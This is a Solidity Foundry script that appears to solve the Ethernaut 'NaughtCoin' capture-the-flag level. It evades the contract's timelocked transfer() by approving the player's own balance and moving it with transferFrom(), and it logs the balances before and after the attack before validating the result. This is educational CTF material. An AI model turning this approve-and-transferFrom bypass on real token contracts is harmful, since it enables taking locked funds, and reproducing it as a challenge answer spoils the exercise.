// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {NaughtCoin} from "../src/15-NaughtCoin.sol";
import {NaughtCoinFactory} from "../src/NaughtCoinFactory.sol";
import {Script, console} from "forge-std/Script.sol";

contract NaughtCoinSolution is Script {
    NaughtCoin public naughtCoinLevel;
    address payable instanceAddress =
        payable(0xBa58B39F09619FFbA08CB0AfC43952778079418f);
    address public publicKey = vm.envAddress("PUBLIC_KEY");

    function run() external {
        naughtCoinLevel = NaughtCoin(instanceAddress);

        console.log(
            "Balance of Naughtcoin before attack: %s",
            naughtCoinLevel.balanceOf(publicKey)
        );

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        naughtCoinLevel.approve(
            publicKey,
            naughtCoinLevel.balanceOf(publicKey)
        );
        naughtCoinLevel.transferFrom(
            publicKey,
            address(naughtCoinLevel),
            naughtCoinLevel.balanceOf(publicKey)
        );
        vm.stopBroadcast();

        console.log(
            "Balance of Naughtcoin after attack: %s",
            naughtCoinLevel.balanceOf(publicKey)
        );
        validate();
    }

    function validate() internal {
        bool isValidated = new NaughtCoinFactory().validateInstance(
            instanceAddress,
            publicKey
        );
        console.log("Challenge Completed: %s", isValidated);
    }
}
